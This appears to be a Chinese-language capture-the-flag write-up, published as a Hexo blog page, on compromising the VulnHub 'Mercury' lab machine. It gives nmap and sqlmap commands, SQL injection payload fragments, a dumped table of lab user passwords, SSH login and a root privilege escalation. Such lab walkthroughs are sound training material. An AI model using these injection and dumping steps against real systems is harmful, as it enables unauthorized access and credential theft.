@@ -1,0 +1,361 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>Mercury CTF 笔记 | ctf-writeups</title>
+    <meta name="author" content="Lulika Vith" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/ctf-writeups/images/avatar.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/ctf-writeups/js/lib/highlight.js"></script>
+
+
+
+<script src="/ctf-writeups/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/ctf-writeups/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/ctf-writeups/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/ctf-writeups/">
+            <span>CTF-WRITEUPS</span>
+        </a>
+        
+        <a href="/ctf-writeups/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/ctf-writeups/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/ctf-writeups/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/ctf-writeups/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;CTF-WRITEUPS</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/ctf-writeups/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/ctf-writeups/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/ctf-writeups/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/ctf-writeups/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>Mercury CTF 笔记</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/4/21
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/ctf-writeups/tags/vulnhub/" style="color: #00bcd4">
+                    vulnhub
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/ctf-writeups/tags/CTF%E7%BB%83%E4%B9%A0/" style="color: #00a596">
+                    CTF练习
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/ctf-writeups/tags/Mercury/" style="color: #ffa2c4">
+                    Mercury
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><ul>
+<li><strong>目标类型</strong>：基础练习  </li>
+<li><strong>目标名称</strong>：Mercury  </li>
+<li><strong>获取方式</strong>：从 <a target="_blank" rel="noopener" href="https://www.vulnhub.com/">https://www.vulnhub.com</a> 下载</li>
+</ul>
+<hr>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><blockquote>
+<p>按时间顺序记录每一步的 <strong>手段（Method）</strong>、<strong>发现（Finding）</strong> 及 <strong>结论 &#x2F; 推测（Note）</strong>。</p>
+</blockquote>
+<h3 id="Step-1-—-发现目标-IP"><a href="#Step-1-—-发现目标-IP" class="headerlink" title="Step 1 — 发现目标 IP"></a>Step 1 — 发现目标 IP</h3><ul>
+<li><strong>Method</strong>：<code>arp-scan</code><pre><code class="language-bash">sudo arp-scan --interface=vboxnet0 192.168.56.0/24
+</code></pre>
+</li>
+<li><strong>Finding</strong>：目标地址 <code>192.168.56.101</code></li>
+<li><strong>Note</strong>：确认虚拟机在线</li>
+</ul>
+<h3 id="Step-2-—-端口扫描"><a href="#Step-2-—-端口扫描" class="headerlink" title="Step 2 — 端口扫描"></a>Step 2 — 端口扫描</h3><ul>
+<li><strong>Method</strong>：<code>nmap</code><pre><code class="language-bash">sudo nmap 192.168.56.101
+</code></pre>
+</li>
+<li><strong>Finding</strong>：开放 <code>22/tcp</code>、<code>8080/tcp</code></li>
+<li><strong>Note</strong>：22 可能为 SSH，8080 为 Web 服务</li>
+</ul>
+<h3 id="Step-3-—-首次浏览器访问"><a href="#Step-3-—-首次浏览器访问" class="headerlink" title="Step 3 — 首次浏览器访问"></a>Step 3 — 首次浏览器访问</h3><ul>
+<li><strong>Method</strong>：浏览器打开 <a target="_blank" rel="noopener" href="http://192.168.56.101:8080/">http://192.168.56.101:8080</a></li>
+<li><strong>Finding</strong>：页面仅一行文字</li>
+<li><strong>Note</strong>：继续深挖</li>
+</ul>
+<h3 id="Step-4-—-ZAP-扫描与站点发现"><a href="#Step-4-—-ZAP-扫描与站点发现" class="headerlink" title="Step 4 — ZAP 扫描与站点发现"></a>Step 4 — ZAP 扫描与站点发现</h3><ul>
+<li><strong>Method</strong>：OWASP ZAP</li>
+<li><strong>Finding</strong>：<ul>
+<li>站点基于 <em>Python + Django</em>，由 <em>uWSGI</em> 托管，且运行在 <strong>DEBUG</strong> 模式  </li>
+<li>发现 <code>sitemap.xml</code>，定位真实路径 <a target="_blank" rel="noopener" href="http://192.168.56.101:8080/mercuryfacts/">http://192.168.56.101:8080/mercuryfacts/</a>  </li>
+<li>发现直接数据库调用示例 <a target="_blank" rel="noopener" href="http://192.168.56.101:8080/mercuryfacts/1">http://192.168.56.101:8080/mercuryfacts/1</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="Step-5-—-TODO-页面信息泄露"><a href="#Step-5-—-TODO-页面信息泄露" class="headerlink" title="Step 5 — TODO 页面信息泄露"></a>Step 5 — TODO 页面信息泄露</h3><ul>
+<li><strong>Method</strong>：访问 <code>/mercuryfacts/todo</code></li>
+<li><strong>Finding</strong>：  <ol>
+<li>目前未使用用户表认证  </li>
+<li>数据库操作未走 Django ORM，而是直接 SQL</li>
+</ol>
+</li>
+</ul>
+<h3 id="Step-6-—-SQL-注入检测"><a href="#Step-6-—-SQL-注入检测" class="headerlink" title="Step 6 — SQL 注入检测"></a>Step 6 — SQL 注入检测</h3><ul>
+<li><strong>Method</strong>：<code>sqlmap</code><pre><code class="language-bash">sqlmap -u &quot;http://192.168.56.101:8080/mercuryfacts/&quot; --dbs
+</code></pre>
+</li>
+<li><strong>Finding</strong>：确认三种注入方式  <ol>
+<li><strong>报错注入</strong>  <pre><code>.../GTID_SUBSET(CONCAT(0x7162787a71,(SELECT (ELT(5587=5587,1))),0x7171767a71),5587)
+</code></pre>
+</li>
+<li><strong>时间盲注</strong>  <pre><code>.../(CASE WHEN (4872=4872) THEN SLEEP(5) ELSE 4872 END)
+</code></pre>
+</li>
+<li><strong>UNION 注入</strong>  <pre><code>.../-9645 UNION ALL SELECT CONCAT(...)
+</code></pre>
+</li>
+</ol>
+<p>获取数据库：<code>information_schema</code>, <code>mercury</code></p>
+</li>
+</ul>
+<h3 id="Step-7-—-获取站点路径"><a href="#Step-7-—-获取站点路径" class="headerlink" title="Step 7 — 获取站点路径"></a>Step 7 — 获取站点路径</h3><ul>
+<li><strong>Method</strong>：利用报错注入</li>
+<li><strong>Finding</strong>：Django 项目路径 <code>/home/webmaster/mercury_proj</code></li>
+</ul>
+<h3 id="Step-8-—-数据库权限枚举"><a href="#Step-8-—-数据库权限枚举" class="headerlink" title="Step 8 — 数据库权限枚举"></a>Step 8 — 数据库权限枚举</h3><ul>
+<li><strong>Method</strong>：<pre><code class="language-bash">sqlmap -u &quot;http://192.168.56.101:8080/mercuryfacts/&quot; --privileges
+</code></pre>
+</li>
+<li><strong>Finding</strong>：用户 <code>dbmaster</code> 权限仅 <code>USAGE</code></li>
+</ul>
+<h3 id="Step-9-—-枚举数据表"><a href="#Step-9-—-枚举数据表" class="headerlink" title="Step 9 — 枚举数据表"></a>Step 9 — 枚举数据表</h3><ul>
+<li><strong>Method</strong>：<pre><code class="language-bash">sqlmap -u &quot;http://192.168.56.101:8080/mercuryfacts/&quot; -D mercury --tables
+</code></pre>
+</li>
+<li><strong>Finding</strong>：表 <code>facts</code>、<code>users</code></li>
+</ul>
+<h3 id="Step-10-—-Dump-用户表"><a href="#Step-10-—-Dump-用户表" class="headerlink" title="Step 10 — Dump 用户表"></a>Step 10 — Dump 用户表</h3><ul>
+<li><strong>Method</strong>：<pre><code class="language-bash">sqlmap -u &quot;http://192.168.56.101:8080/mercuryfacts/&quot; -D mercury -T users -C username,password --dump
+</code></pre>
+</li>
+<li><strong>Finding</strong>：明文账户<table>
+<thead>
+<tr>
+<th>username</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>john</td>
+<td>johnny1987</td>
+</tr>
+<tr>
+<td>laura</td>
+<td>lovemykids111</td>
+</tr>
+<tr>
+<td>sam</td>
+<td>lovemybeer111</td>
+</tr>
+<tr>
+<td>webmaster</td>
+<td>mercuryisthesizeof0.056Earths</td>
+</tr>
+</tbody></table>
+</li>
+<li><strong>Note</strong>：尝试 SSH 登录</li>
+</ul>
+<h3 id="Step-11-—-获取-user-flag"><a href="#Step-11-—-获取-user-flag" class="headerlink" title="Step 11 — 获取 user flag"></a>Step 11 — 获取 user flag</h3><ul>
+<li><strong>Method</strong>：SSH 登录<pre><code class="language-bash">ssh webmaster@192.168.56.101
+</code></pre>
+</li>
+<li><strong>Finding</strong>：<code>webmaster</code> 登录成功<br><code>user_flag_8339915c9a454657bd60ee58776f4ccd</code></li>
+</ul>
+<h3 id="Step-12-—-本地提权"><a href="#Step-12-—-本地提权" class="headerlink" title="Step 12 — 本地提权"></a>Step 12 — 本地提权</h3><ul>
+<li><strong>Method</strong>：上传 <code>linux-exploit-suggester</code>，选择可行漏洞</li>
+<li><strong>Finding</strong>：成功获得 <strong>root shell</strong></li>
+</ul>
+<hr>
+<h2 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h2><ul>
+<li>获得 <strong>root</strong> 权限  </li>
+<li>成功读取 Flag</li>
+</ul>
+<p><img src="/ctf-writeups/images/Mercury/flag.png" alt="Flag"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2025 - 2025 ctf-writeups
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Lulika Vith
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/ctf-writeups/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
